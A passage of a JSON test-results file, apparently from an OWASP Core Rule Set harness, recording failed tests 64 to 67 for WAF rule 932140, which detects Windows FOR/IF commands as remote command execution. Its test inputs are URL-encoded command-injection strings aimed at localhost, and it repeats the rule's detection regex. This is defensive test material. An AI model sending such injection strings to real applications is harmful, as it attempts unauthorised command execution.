          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 64,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 64,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%25%25f+in+%28%2A.TXT+%2A.BAT+%2A.DOC%29+do+TYPE+%25%25f",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 65,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 65,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%25%25P+in+%28%25PATH%25%29+do+if+exist+%25%25P%5C%2A.BAT+COPY+%25%25P%5C%2A.BAT+C%3A%5CBAT",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 66,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 66,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+filename.txt+++++%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 67,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 67,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++EXIST+filename+++++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
